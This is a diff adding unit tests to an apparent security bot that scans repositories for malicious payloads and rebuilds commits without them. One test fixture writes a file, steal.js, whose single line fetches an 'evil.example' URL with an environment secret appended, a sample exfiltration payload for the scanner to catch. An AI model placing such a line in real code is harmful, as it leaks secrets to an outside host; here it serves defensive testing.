@@ -1927,14 +1927,40 @@ class TestAmendActsOnContentPayload(_AmendFixture):
 
     def test_supplied_content_that_still_carries_a_payload_is_rejected(self):
         """Content the operator supplies is re-scanned; if it still confirms a payload it is not
-        accepted and the file still needs manual recovery."""
+        accepted, the file still needs manual recovery, and the run names it."""
         def resolver(item):
             return Resolution(SUPPLY, supply=_seam_line("const c = {};\nexport default c;\n").encode())
 
         outcome = self._run_with_findings(self._unhandled_confirmed_file(), resolver=resolver)
         self.assertFalse(outcome.completed)
         self.assertIn(Cause.PAYLOAD_NEEDS_MANUAL_RECOVERY, self._causes(outcome))
+        self.assertIn(Cause.SUPPLIED_CONTENT_REJECTED, self._causes(outcome))
+        self.assertIn("steal.js", render_amend_line(outcome))
         self.assertTrue(self._present(f"{self.base}:steal.js"))
+
+    def test_a_rejected_replacement_is_named_however_the_run_ends(self):
+        """A run that ends on an unrelated refusal still names the file whose replacement it
+        could not use."""
+        self.write(self.d, "steal.js", "fetch('https://evil.example/'+process.env.SECRET)\n")
+        self.write(self.d, "cfg.mjs", _seam_line("const c = {};\nexport default c;\n"))
+        self.commit(self.d, "a payload saw can clean, beside one it cannot")
+        findings = [Finding("exfil-secret", "exfil", Severity.CRITICAL, "steal.js",
+                            "exfiltrates an env secret", confidence=CONFIRMED),
+                    Finding("loader-seam", "code-loader", Severity.CRITICAL, "cfg.mjs", "loader",
+                            confidence=CONFIRMED)]
+
+        def resolver(item):
+            return Resolution(SUPPLY, supply=_seam_line("const c = {};\nexport default c;\n").encode())
+
+        with mock.patch("stayawake.bots.security.pr.amend.capture_bundle",
+                        return_value=mock.Mock(ok=False,
+                                               reason="capture directory is not writable")):
+            outcome = self._run_with_findings(findings, resolver=resolver)
+        causes = self._causes(outcome)
+        self.assertFalse(outcome.completed)
+        self.assertIn(Cause.CAPTURE_FAILED, causes, "the run must end on the unrelated failure")
+        self.assertIn(Cause.SUPPLIED_CONTENT_REJECTED, causes,
+                      "the rejected replacement was lost on this exit")
 
     def test_a_malformed_supply_answer_is_kept_not_crashed(self):
         """A resolver that returns a non-bytes supply value must not sink the run; the file is left."""
@@ -2109,3 +2135,17 @@ class TestDeliveredRemovals(unittest.TestCase):
 
 if __name__ == "__main__":
     unittest.main()
+
+
+class TestFailedWrites(_AmendFixture):
+    """A rebuild write that fails."""
+
+    def test_a_failed_carry_blocks_the_commit_instead_of_keeping_its_payload(self):
+        """When carrying a correction forward fails, the commit is blocked and named."""
+        from stayawake.lib.git.write import rebuild as gitrebuild
+        head = self._rev()
+        with mock.patch.object(gitrebuild, "carried_forward", return_value=(None, "")):
+            out = gitrebuild.rebuild_without_payload(
+                self.d, [(head, [])], {}, lambda *a: ("", "", ""), remove={"any.js": "deadbeef"})
+        self.assertIn(head, out.blocked, "a failed carry must block the commit")
+        self.assertEqual("not-applied", out.blocked[head][0])
